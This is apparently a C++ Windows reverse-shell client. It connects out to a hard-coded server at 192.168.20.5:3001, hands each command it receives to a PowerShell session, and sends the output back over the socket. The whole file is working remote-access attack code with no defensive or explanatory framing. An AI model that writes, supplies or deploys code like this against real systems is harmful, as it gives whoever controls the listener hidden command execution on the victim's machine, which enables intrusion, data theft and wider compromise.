#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include "PowerShellSession.hpp"

#pragma comment(lib, "ws2_32.lib")

VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
    INT iBytesReceived;
    CHAR carrRecvbuf[MAX_BUFFER_SIZE];
    uint32_t uiNetMessageLen;
    std::string szCwd;
    std::string szFinalCwd;
    std::string szFinalData;
    std::string szCommandOutput;

    while ((iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0)) > 0) {
        carrRecvbuf[iBytesReceived] = '\0';
        std::string command(carrRecvbuf);

        std::cout << "[+] Received command: " << command << "\n";
        szCommandOutput = psSession.RunCommand(command);

        uiNetMessageLen = htonl(szCommandOutput.size());
        szFinalData = std::string(reinterpret_cast<char*>(&uiNetMessageLen), 4);
        szFinalData += szCommandOutput;

        send(socket, szFinalData.data(), szFinalData.length(), 0);
    }
}


INT main() {
    const INT iServerPort = 3001;
    const CHAR* szServerIp = "192.168.20.5";
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in serverAddr = {};
    PowerShellSession psSession;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(iServerPort);

    if (inet_pton(AF_INET, szServerIp, &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to server " << szServerIp << ":" << iServerPort << "\n";
    CommandListenerLoop(sock, psSession);
    closesocket(sock);
    WSACleanup();
    return 0;
}
